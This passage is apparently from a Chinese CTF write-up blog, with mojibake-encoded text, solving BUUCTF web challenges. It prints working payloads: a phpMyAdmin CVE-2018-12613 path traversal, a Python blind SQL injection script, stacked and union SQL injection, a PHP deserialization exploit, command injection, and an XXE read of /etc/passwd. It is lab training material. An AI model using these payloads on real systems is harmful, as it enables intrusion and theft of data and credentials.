class="line">Cookie:PHPSESSID=flag.php</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=show_source(session_id(session_start()));</span><br></pre></td></tr></table></figure><p>å¾—åˆ°flag</p><p><img src="/../images/image-20231114093203760.png" alt="image-20231114093203760"></p><h2 id="åˆ©ç”¨å‡½æ•°æ‰¾åˆ°å¹¶ä»£æ›¿flag-php"><a href="#åˆ©ç”¨å‡½æ•°æ‰¾åˆ°å¹¶ä»£æ›¿flag-php" class="headerlink" title="åˆ©ç”¨å‡½æ•°æ‰¾åˆ°å¹¶ä»£æ›¿flag.php"></a>åˆ©ç”¨å‡½æ•°æ‰¾åˆ°å¹¶ä»£æ›¿flag.php</h2><p>localeconv()å›æ˜¾æ•°ç»„ï¼Œç¬¬ä¸€ä¸ªæ•°ç»„æ˜¯å­—ç¬¦.</p><p>pos()ä¼ å…¥æ•°ç»„ï¼Œå›æ˜¾ç¬¬ä¸€ä¸ªæ•°ç»„çš„å€¼</p><p>pos(localeconv())ç›¸å½“äºç­‰å·</p><p>scandir(.)ä»¥æ•°ç»„å½¢å¼å›æ˜¾å½“å‰ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶</p><p>print_r()è¾“å‡º</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(<span class="keyword">pos</span>(localeconv())));</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231114094130072.png" alt="image-20231114094130072"></p><p>array_reverse()æ•°ç»„åè½¬</p><p>next()æ•°ç»„æŒ‡é’ˆç§»åŠ¨ä¸‹ä¸€ä½</p><p>show_source(next(array_reverse(scandir(pos(localeconv())))));</p><p><img src="/../images/image-20231114094459315.png" alt="image-20231114094459315"></p><h1 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h1><p>dirsearchæ‰«ç›®å½•ï¼Œå‘ç°.gitæ³„éœ²</p><p>ä¸Šgithack</p><p>index.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$yds</span> = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line"><span class="variable">$is</span> = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line"><span class="variable">$handsome</span> = <span class="string">&#x27;yds&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;the flag is: &quot;</span>.<span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure><p>å®¡è®¡ï¼š</p><p>å¦‚æœpostä¼ å‚flagå’Œgetä¼ å‚flagéƒ½ä¸ä¸ºç©ºæ—¶è¾“å‡ºdogå¹¶é€€å‡º</p><p>å¦‚æœpostä¼ å‚flag&#x3D;flagæˆ–getä¼ å‚flag&#x3D;flagæ—¶ï¼Œè¾“å‡ºcatå¹¶é€€å‡º</p><p>foreachéå†ï¼Œå¦‚æœgetä¼ å‚flag&#x3D;xä¸”x!&#x3D;flagè¾“å‡ºhandsomeå¹¶é€€å‡º</p><p>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?handsome=flag&amp;flag=handsome</span><br></pre></td></tr></table></figure><p><strong>å˜é‡è¦†ç›–</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?yds=flag</span><br></pre></td></tr></table></figure><p>$x &#x3D; yds $y &#x3D; flag</p><p>$$x &#x3D; $yds $$y &#x3D; $flag</p><p>$yds &#x3D; $flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?is=flag&amp;flag=flag</span><br></pre></td></tr></table></figure><p>$is &#x3D; $flag</p><p>è¾“å‡º$is å¿…é¡»æ»¡è¶³get&#x2F;postä¼ å‚flag&#x3D;flag</p><h1 id="GWCTF-2019-æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“"><a href="#GWCTF-2019-æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“" class="headerlink" title="[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“"></a>[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“</h1><p><strong>CVE-2018-12613</strong></p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?target=db_sql.php%253f/../../../../flag</span><br></pre></td></tr></table></figure><h1 id="CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World"></a>[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World</h1><p><img src="/../images/image-20231104151346329.png" alt="image-20231104151346329"></p><p>è¾“å…¥1æ­£ç¡®å›æ˜¾ï¼Œå…¶ä»–åˆ™é”™è¯¯ï¼Œç›²æ³¨</p><p><strong>æ‹¬å·ä»£æ›¿ç©ºæ ¼æ¥åˆ†å‰²</strong></p><p>æ„é€ </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=(select(ascii(mid(flag,1,1))=102)from(flag))</span><br></pre></td></tr></table></figure><p>pyè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">blind_sql</span>(<span class="params">url</span>):</span><br><span class="line">    flag=<span class="string">&#x27;&#x27;</span>                     <span class="comment">#æ¥æ”¶ç»“æœ</span></span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):     <span class="comment">#flagä¸€èˆ¬ä¸è¶…è¿‡50ä¸ªå­—ç¬¦</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> string.printable:  <span class="comment">#string.printableå°†ç»™å‡ºæ‰€æœ‰çš„æ ‡ç‚¹ç¬¦å·ï¼Œæ•°å­—ï¼Œascii_letterså’Œç©ºæ ¼</span></span><br><span class="line">            payload=<span class="string">&#x27;(select(ascii(mid(flag,&#123;0&#125;,1))=&#123;1&#125;)from(flag))&#x27;</span>.<span class="built_in">format</span>(num,<span class="built_in">ord</span>(i)) <span class="comment">#ordå‡½æ•°ç”¨æ¥è·å–å•ä¸ªå­—ç¬¦çš„asciiç </span></span><br><span class="line">            post = &#123;<span class="string">&quot;id&quot;</span>:payload&#125;</span><br><span class="line">            result = requests.post(url=url,data=post)   <span class="comment">#æäº¤postè¯·æ±‚</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;Hello&#x27;</span> <span class="keyword">in</span> result.text:</span><br><span class="line">                flag += i   <span class="comment">#ç”¨flagæ¥æ”¶ç›²æ³¨å¾—åˆ°çš„ç»“æœ</span></span><br><span class="line">                <span class="built_in">print</span>(flag) <span class="comment">#æ‰“å°ç»“æœ</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    url=<span class="string">&#x27;http://935ab885-c359-48b2-8673-50710c1c3e72.node4.buuoj.cn:81/&#x27;</span></span><br><span class="line">    blind_sql(url)</span><br></pre></td></tr></table></figure><h1 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h1><p>é»‘åå•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&quot;,$inject)</span><br></pre></td></tr></table></figure><p>å°è¯•äº†å¤§å°å†™ã€æ³¨é‡Šã€å†…è”æ³¨é‡Šéƒ½æ²¡ç”¨</p><h2 id="å †å æ³¨å…¥ï¼š"><a href="#å †å æ³¨å…¥ï¼š" class="headerlink" title="å †å æ³¨å…¥ï¼š"></a><strong>å †å æ³¨å…¥ï¼š</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;; show databases; #</span><br><span class="line">-1&#x27;; show tables from ctftraining; #</span><br><span class="line">-1&#x27;; show tables; #</span><br><span class="line">-1&#x27;; show columns from FlagHere  ; #</span><br></pre></td></tr></table></figure><p>æœ€åå¾—åˆ°å­—æ®µFlagHere</p><p>è¿™é‡Œç”¨<strong>Handler</strong>è¯»å–</p><p>Handler open æ‰“å¼€ä¸€ä¸ªè¡¨</p><p>Handler  read è¯»å–</p><p>Handler closeå…³é—­</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-1;</span><br><span class="line">Handler FlagHere open ;</span><br><span class="line">Handler FlagHere read first;</span><br><span class="line">Handler FlagHere close;</span><br></pre></td></tr></table></figure><h1 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h1><p>union select 1,2,3</p><p>é€ä¸ªæµ‹è¯•adminï¼Œå‘ç°usernameåœ¨ç¬¬äºŒä¸ªå­—æ®µ</p><p>è”åˆæ³¨å…¥<strong>åˆ›å»ºä¸€æ¡ä¸´æ—¶æ•°æ®</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=1&#x27; union select 1,&#x27;admin&#x27;,&#x27;c4ca4238a0b923820dcc509a6f75849b&#x27;#&amp;pw=1</span><br></pre></td></tr></table></figure><h1 id="ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz"><a href="#ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz" class="headerlink" title="[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz"></a>[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz</h1><p>æºç å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="variable">$res</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>((<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;filename, <span class="variable">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; <span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_valid</span>(<span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="variable">$obj</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å®¡è®¡"><a href="#å®¡è®¡" class="headerlink" title="å®¡è®¡"></a>å®¡è®¡</h2><p>ä»ä¸Šå¾€ä¸‹çœ‹ï¼Œå¦‚æœè§¦å‘__constructæ–¹æ³•ï¼Œä¼šèµ‹å€¼op&#x3D;1ï¼Œå¹¶ä¸”è°ƒç”¨processæ–¹æ³•</p><p>å†çœ‹processæ–¹æ³•ï¼Œå¦‚æœop&#x3D;1ï¼Œåˆ™ä¼šè°ƒç”¨write()æ–¹æ³•ï¼ŒæŠŠ<em>Hello World!<em>å†™å…¥</em>&#x2F;tmp&#x2F;tmpfile</em></p><p>è€Œæœ€åä¸€è¡Œå¯¹getä¼ å‚strè¿›è¡Œäº†ç±»å‹è½¬æ¢ï¼Œå¹¶ä¸”ååºåˆ—åŒ–ï¼Œè¿™å¹¶ä¸æ˜¯åœ¨åˆ›å»ºå¯¹è±¡ï¼Œæ‰€ä»¥ä¸ä¼šè§¦å‘__constructæ–¹æ³•</p><p>å¦‚æœæƒ³è¦è§¦å‘__destructæ–¹æ³•ï¼Œå¿…é¡»ä½¿op&#x3D;2ç»•è¿‡ifåˆ¤æ–­,è°ƒç”¨processæ–¹æ³•ï¼Œè¿›è€Œè°ƒç”¨readæ–¹æ³•ï¼Œå†åˆ©ç”¨filenameå±æ€§å»è¯»å–flag.php</p><h2 id="æ„é€ "><a href="#æ„é€ " class="headerlink" title="æ„é€ "></a>æ„é€ </h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$op</span>,<span class="variable">$filename</span>,<span class="variable">$content</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;op=<span class="variable">$op</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;filename=<span class="variable">$filename</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;content=<span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">FileHandler</span>(<span class="number">2</span>,<span class="string">&#x27;flag.php&#x27;</span>,<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œä¸€ä¸‹</p><p><img src="/../images/image-20231103193613731.png" alt="image-20231103193613731"></p><p>æˆåŠŸæ‹¿åˆ°flag</p><p><img src="/../images/image-20231103193653759.png" alt="image-20231103193653759"></p><h1 id="ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb"><a href="#ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb" class="headerlink" title="[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb"></a>[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb</h1><p>æ‰“å¼€ç¯å¢ƒ</p><p><img src="/../images/image-20231216142312108.png" alt="image-20231216142312108"></p><p>å•¥ä¹Ÿçœ‹ä¸å‡ºæ¥ï¼ŒæŠ“ä¸ªåŒ…</p><p><img src="/../images/image-20231216142354527.png" alt="image-20231216142354527"></p><p>funcæ˜¯å‡½æ•°ï¼Œpæ˜¯å‡½æ•°çš„å‚æ•°</p><p>å°è¯•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func=system&amp;p=whoami</span><br></pre></td></tr></table></figure><p>è¢«è¿‡æ»¤</p><p><img src="/../images/image-20231216142552487.png" alt="image-20231216142552487"></p><p>åŠ ä¸ªåæ–œæ ï¼Œå¯ä»¥æ‰§è¡Œ</p><p><img src="/../images/image-20231216142627523.png" alt="image-20231216142627523"></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func=\system&amp;p=cat $(find / -name flag*)</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231216142945673.png" alt="image-20231216142945673"></p><h1 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h1><p>æ‰“å¼€ç¯å¢ƒ</p><p><img src="/../images/image-20231216143424625.png" alt="image-20231216143424625"></p><p>æ ¹æ®é¢˜ç›®çŒœæµ‹æ˜¯XXE</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ENTITY admin SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">  ]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231216143833788.png" alt="image-20231216143833788"></p><p><img src="/../images/image-20231216143908742.png" alt="image-20231216143908742"></p><h1 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h1><p>æ‰“å¼€ç¯å¢ƒ</p><p><img src="/../images/image-20231216144112963.png" alt="image-20231216144112963"></p><p>flag</p><p><img src="/../images/image-20231216144446052.png" 